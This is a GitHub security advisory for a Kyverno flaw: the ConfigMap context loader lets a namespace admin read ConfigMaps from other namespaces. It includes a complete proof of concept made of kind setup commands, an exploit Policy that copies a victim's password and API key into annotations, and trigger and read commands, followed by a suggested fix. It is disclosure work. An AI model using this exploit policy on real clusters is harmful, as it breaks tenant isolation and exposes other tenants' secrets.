# [H] Kyverno: Cross-Namespace Read Bypasses RBAC Isolation (CVE-2026-22039 Incomplete Fix)

## Summary
Severity: High
Advisory: GHSA-cvq5-hhx3-f99p
CVE: CVE-2026-41068
CWE: CWE-863
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-04-16
Source: https://github.com/advisories/GHSA-cvq5-hhx3-f99p
Type: github-advisory

## Affected
- Go: `github.com/kyverno/kyverno` — affected >=0

## Details
### Summary

CVE-2026-22039 fixed cross-namespace privilege escalation in Kyverno's `apiCall` context by validating the `URLPath` field. However, the **ConfigMap context loader has the identical vulnerability** — the `configMap.namespace` field accepts any namespace with zero validation, allowing a namespace admin to read ConfigMaps from any namespace using Kyverno's privileged service account. This is a complete RBAC bypass in multi-tenant Kubernetes clusters.

### Details

**Root cause:** The CVE-2026-22039 fix in `pkg/engine/apicall/apiCall.go` (lines 73-83) validates that `URLPath` references only the policy's own namespace using regex. However, the ConfigMap context loader at `pkg/engine/context/loaders/configmap.go` performs **no namespace validation** on the `namespace` field.

**Code path comparison:**

| | CVE-2026-22039 (fixed) | This vulnerability (unfixed) |
|--|---|---|
| **Location** | `apiCall.URLPath` field | `configMap.namespace` field |
| **Code path** | `apicall.Fetch()` → namespace regex validation | `configmap.NewConfigMapLoader()` → no validation |
| **Root cause** | Variable substitution + missing validation | Same pattern, still unpatched |

**Exploit mechanism:**
1. Namespace admin creates a Kyverno Policy in their namespace (standard RBAC)
2. Policy uses `context.configMap.namespace: "victim-ns"` to reference another namespace
3. Kyverno's admission controller service account (has cluster-wide `view` role) fetches the ConfigMap
4. Policy mutates a trigger ConfigMap to exfiltrate the stolen data via annotations

**Affected code:** `pkg/engine/context/loaders/configmap.go` - `NewConfigMapLoader()` does not validate resolved namespace against policy namespace.

### PoC

Full reproduction (5 minutes on `kind`):

```bash
#!/bin/bash
# Setup: kind cluster + Kyverno v1.17.0
kind create cluster --name kyverno-poc --wait 60s
helm repo add kyverno https://kyverno.github.io/kyverno/
helm install kyverno kyverno/kyverno --namespace kyverno --create-namespace --version 3.7.0 --wait

# Create attacker and victim namespaces
kubectl create namespace attacker-ns
kubectl create namespace victim-ns

# Plant sensitive data in victim namespace
kubectl create configmap sensitive-config -n victim-ns \
    --from-literal=db-password="s3cr3t-p4ssw0rd" \
    --from-literal=api-key="AKIAIOSFODNN7EXAMPLE"

# Create namespace admin RBAC (standard multi-tenant setup)
kubectl create serviceaccount ns-admin -n attacker-ns
kubectl create rolebinding ns-admin-binding --clusterrole=admin \
    --serviceaccount=attacker-ns:ns-admin --namespace=attacker-ns
kubectl create role kyverno-policy-creator --verb=create,get,list \
    --resource=policies.kyverno.io --namespace=attacker-ns
kubectl create rolebinding kyverno-policy-binding --role=kyverno-policy-creator \
    --serviceaccount=attacker-ns:ns-admin --namespace=attacker-ns

# Verify namespace admin CANNOT directly access victim-ns
kubectl get configmap sensitive-config -n victim-ns \
    --as=system:serviceaccount:attacker-ns:ns-admin
# Error: Forbidden (expected)
```

**Exploit policy:**
```yaml
# Apply as namespace admin
apiVersion: kyverno.io/v1
kind: Policy
metadata:
  name: configmap-crossns-read
  namespace: attacker-ns
spec:
  rules:
  - name: steal-configmap
    match:
      any:
      - resources:
          kinds: [ConfigMap]
          names: ["trigger-cm"]
    context:
    - name: stolendata
      configMap:
        name: "sensitive-config"
        namespace: "victim-ns"    # <-- NO VALIDATION
    mutate:
      patchStrategicMerge:
        metadata:
          annotations:
            exfil-db-password: "{{ stolendata.data.\"db-password\" }}"
            exfil-api-key: "{{ stolendata.data.\"api-key\" }}"
```

**Trigger and exfiltrate:**
```bash
# Trigger policy (as namespace admin)
kubectl apply -f - <<EOF
apiVersion: v1
kind: ConfigMap
metadata:
  name: trigger-cm
  namespace: attacker-ns
data:
  innocent: "data"
EOF

# Read exfiltrated secrets
kubectl get configmap trigger-cm -n attacker-ns -o jsonpath='{.metadata.annotations}' \
    --as=system:serviceaccount:attacker-ns:ns-admin | python3 -m json.tool
# Output:
# {
#     "exfil-api-key": "AKIAIOSFODNN7EXAMPLE",
#     "exfil-db-password": "s3cr3t-p4ssw0rd"
# }
```

**Result:** Namespace admin successfully read secrets from `victim-ns` despite having NO RBAC access.

### Impact

**Severity: HIGH (CVSS 7.7)**

**Who is affected:**
- Any Kubernetes cluster running Kyverno v1.17.0 (and earlier) with namespace-scoped Policy creation enabled (default)
- Multi-tenant clusters where ConfigMaps contain sensitive data
- Azure Kubernetes Service (AKS) and other managed K8s using Kyverno

**Attack prerequisites:**
- Namespace admin privileges (standard RBAC in multi-tenant clusters)
- Ability to create Kyverno Policy resources (default for namespace admins)
- No cluster-admin required

**What can be exfiltrated:**
- Any ConfigMap from any namespace
- Common targets: database credentials, API keys, service configurations, application secrets stored in ConfigMaps

**Why this matters:**
- Namespace isolation is a fundamental Kubernetes security boundary
- Namespace admin is an expected, common RBAC level in production multi-tenant clusters
- Violates the principle of least privilege and breaks multi-tenancy guarantees

**Suggested fix:**
Apply the same namespace validation from `apicall.Fetch()` to `configmap.NewConfigMapLoader()`:
1. Pass `policyNamespace` to `NewConfigMapLoader()`
2. After variable substitution on `namespace`, validate resolved namespace == `policyNamespace`
3. Return error if validation fails

Also audit other context loaders (`globalReference`, `imageRegistry`, `variable`) for the same pattern.

**Tested versions:**
- Kyverno: v1.17.0 (latest, includes CVE-2026-22039 fix)
- Helm chart: 3.7.0
- Kubernetes: v1.35.0 (kind)

## References
- https://github.com/kyverno/kyverno/security/advisories/GHSA-cvq5-hhx3-f99p
- https://nvd.nist.gov/vuln/detail/CVE-2026-41068
- https://github.com/kyverno/kyverno/commit/bbf3e5c01391d612968440659028ae98e565a777
- https://github.com/kyverno/kyverno
